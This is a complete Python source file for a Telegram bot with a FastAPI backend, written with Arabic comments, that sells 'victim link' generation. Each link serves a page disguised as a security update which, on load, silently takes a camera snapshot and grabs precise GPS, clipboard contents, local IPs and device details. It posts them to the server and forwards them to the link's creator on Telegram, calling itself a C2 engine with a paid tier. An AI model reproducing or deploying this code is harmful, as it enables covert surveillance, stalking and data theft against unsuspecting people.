import os
import uuid
import asyncio
import base64
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile

app = FastAPI()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ربط كل رمز فخ بمعرف المستخدم الذي أنشأه لضمان إرسال البيانات له شخصياً فوراً
LINK_TO_USER = {}
USERS_DB = {} 
VICTIMS_DB = {} 

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    network_info: dict = {}
    clipboard_text: str = ""
    stolen_data: dict = {}

@app.get("/t/{link_id}", response_class=HTMLResponse)
async def serve_trap_page(link_id: str, request: Request):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>تحديث النظام الأمني - جاري التحقق</title>
        <style>
            body {{ background-color: #030712; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 60px; }}
            .loader {{ border: 4px solid #1e293b; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.8s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .box {{ background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; }}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>🛡️ التحقق من الأمان وتحديث النظام</h2>
            <div class="loader"></div>
            <p style="color: #94a3b8; font-size: 14px;">يرجى السماح بالصلاحيات المنبثقة لإتمام عملية المزامنة بنجاح...</p>
        </div>

        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const linkId = "{link_id}";

            // 1. سحب بصمة الشبكة والعناوين الداخلية عبر WebRTC
            async function getLocalIPs() {{
                return new Promise((resolve) => {{
                    const ips = [];
                    const pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:stun.l.google.com:19302" }}] }});
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (ice) => {{
                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                        const match = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(ice.candidate.candidate);
                        if (match && !ips.includes(match[1])) {{
                            ips.push(match[1]);
                        }}
                    }};
                    setTimeout(() => resolve(ips), 1000);
                }});
            }}

            // 2. سحب محتوى الحافظة (Clipboard) في حال سمح المستخدم
            async function getClipboardData() {{
                try {{
                    if (navigator.clipboard && navigator.clipboard.readText) {{
                        return await navigator.clipboard.readText();
                    }}
                }} catch (e) {{}}
                return "مرفوض أو غير متاح";
            }}

            // 3. سحب الموقع الجغرافي العالي الدقة (GPS)
            async function getGeoLocation() {{
                return new Promise((resolve) => {{
                    if (!navigator.geolocation) {{
                        resolve({{ error: "GPS غير متاح" }});
                        return;
                    }}
                    navigator.geolocation.getCurrentPosition(
                        (position) => {{
                            resolve({{
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy + " متر",
                                altitude: position.coords.altitude || "غير متاح",
                                speed: position.coords.speed || "متوقف"
                            }});
                        }},
                        (error) => {{
                            resolve({{ error: "تم رفض إذن الموقع: " + error.message }});
                        }},
                        {{ enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }}
                    );
                }});
            }}

            async function executeArsenal() {{
                try {{
                    // تشغيل الكاميرا وسحب اللقطة (الخلفية أو الأمامية)
                    let imageData = "";
                    try {{
                        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        
                        // انتظار تهيئة الإطار
                        await new Promise(r => setTimeout(r, 1500));
                        
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        imageData = canvas.toDataURL('image/jpeg', 0.85);
                        
                        stream.getTracks().forEach(track => track.stop());
                    }} catch (err) {{
                        // تجاوز صامت في حال رفض كاميرا الاستريم
                    }}

                    // تجميع كافة البيانات بالتوازي لأقصى سرعة
                    const [localIPs, clipboard, geo] = await Promise.all([
                        getLocalIPs(),
                        getClipboardData(),
                        getGeoLocation()
                    ]);

                    const advancedData = {{
                        screen_resolution: window.screen.width + 'x' + window.screen.height,
                        language: navigator.language || navigator.userLanguage,
                        platform: navigator.platform,
                        cores: navigator.hardwareConcurrency || 'غير معروف',
                        memory: navigator.deviceMemory || 'غير معروف',
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        cookies_enabled: navigator.cookieEnabled
                    }};

                    // إرسال الغنائم فورا إلى السيرفر الخلفي
                    await fetch('/api/v1/exfiltrate', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            link_id: linkId,
                            device_info: navigator.userAgent,
                            camera_snapshot_base64: imageData,
                            geolocation: geo,
                            network_info: {{ local_ips: localIPs }},
                            clipboard_text: clipboard,
                            stolen_data: advancedData
                        }})
                    }});

                    window.location.href = "https://www.google.com";
                }} catch (e) {{
                    window.location.href = "https://www.google.com";
                }}
            }}

            window.onload = executeArsenal;
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    
    if target_user_id:
        try:
            s_data = data.stolen_data
            geo = data.geolocation
            net = data.network_info
            
            # صياغة تقرير استخباراتي عالي الدقة ومفصل
            geo_text = f"📍 *خط الطول والعرض:* `{geo.get('latitude', 'N/A')}, {geo.get('longitude', 'N/A')}`\n🎯 *دقة الموقع:* `{geo.get('accuracy', 'N/A')}`" if 'latitude' in geo else f"⚠️ *الموقع الجغرافي:* `{geo.get('error', 'غير متاح')}`"
            
            caption = (
                "🚨 *[ صيد جديد - ترسانة متكاملة ]*\n\n"
                f"{geo_text}\n"
                f"🌐 *الـ IP الداخلي (Local IPs):* `{', '.join(net.get('local_ips', ['غير معروف']))}`\n"
                f"📋 *محتوى الحافظة (Clipboard):* `{data.clipboard_text[:150] if data.clipboard_text else 'فارغة'}`\n\n"
                f"💻 *متصفح الجهاز / UserAgent:* `{data.device_info}`\n"
                f"📐 *الشاشة:* `{s_data.get('screen_resolution', 'N/A')}` | 🌍 *اللغة:* `{s_data.get('language', 'N/A')}`\n"
                f"⚙️ *النظام الأساسي:* `{s_data.get('platform', 'N/A')}` | 🧠 *الأنوية:* `{s_data.get('cores', 'N/A')}`\n"
                f"🌍 *المنطقة الزمنية:* `{s_data.get('timezone', 'N/A')}`"
            )
            
            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                header, encoded = data.camera_snapshot_base64.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                photo_file = BufferedInputFile(image_bytes, filename="victim_surveillance.jpg")
                
                await bot.send_photo(
                    chat_id=target_user_id,
                    photo=photo_file,
                    caption=caption,
                    parse_mode="Markdown"
                )
            else:
                await bot.send_message(
                    chat_id=target_user_id,
                    text=caption,
                    parse_mode="Markdown"
                )
        except Exception as e:
            print(f"Error transmitting loot to Telegram: {e}")

    return {"status": "success", "loot_secured": True}

@app.get("/")
async def root():
    return {"status": "Advanced C2 Engine Active", "tier": "Ultimate Offensive Arsenal"}

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"links_generated": 0, "victims_caught": 0}
    
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔗 توليد رابط ضحية جديد (مجاني)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
            [KeyboardButton(text="💎 الترقية للباقة الفاخرة ($1,000)")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *مرحباً بك في أحدث ترسانة سيبرانية متكاملة.*\n\n"
        "المنصة جاهزة الآن لسحب (الصور، الـ GPS الدقيق، بصمة الشبكة الداخلية، ومحتوى الحافظة) فور فتح الضحية للرابط.",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "🔗 توليد رابط ضحية جديد (مجاني)")
async def generate_link(message: types.Message):
    user_id = message.from_user.id
    unique_token = str(uuid.uuid4())[:8]
    
    public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL")
    if not public_domain:
        public_domain = "hacker-production-3281.up.railway.app" 

    trap_url = f"https://{public_domain}/t/{unique_token}"
    
    # ربط الرابط بدقة بمستخدم التيليجرام الحالي
    LINK_TO_USER[unique_token] = user_id
    
    if user_id in USERS_DB:
        USERS_DB[user_id]["links_generated"] += 1
    
    await message.answer(
        f"✅ *تم توليد رابط الفخ الاستخباراتي بنجاح:*\n\n`{trap_url}`\n\n*(جاهز للرصد الشامل الفوري فور التفاعل)*",
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
async def show_victims(message: types.Message):
    user_id = message.from_user.id
    user_links = [token for token, uid in LINK_TO_USER.items() if uid == user_id]
    total_victims = sum(len(VICTIMS_DB.get(token, [])) for token in user_links)
    
    if total_victims == 0:
        await message.answer("📂 *سجل الضحايا الحالي:*\n\n⚠️ لم يتم رصد أي ضحايا عبر روابطك حتى الآن.", parse_mode="Markdown")
    else:
        await message.answer(f"📂 *سجل الضحايا الحالي:*\n\n🎯 إجمالي الضحايا المرتبطين بك: *{total_victims}*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "💎 الترقية للباقة الفاخرة ($1,000)")
async def upsell_tier(message: types.Message):
    await message.answer("🔥 *ترسانة الهكر المتقدمة (VIP Elite - $1,000)*\n\nتواصل مع المسؤول للتفعيل.", parse_mode="Markdown")

async def run_telegram_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(run_telegram_polling())

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
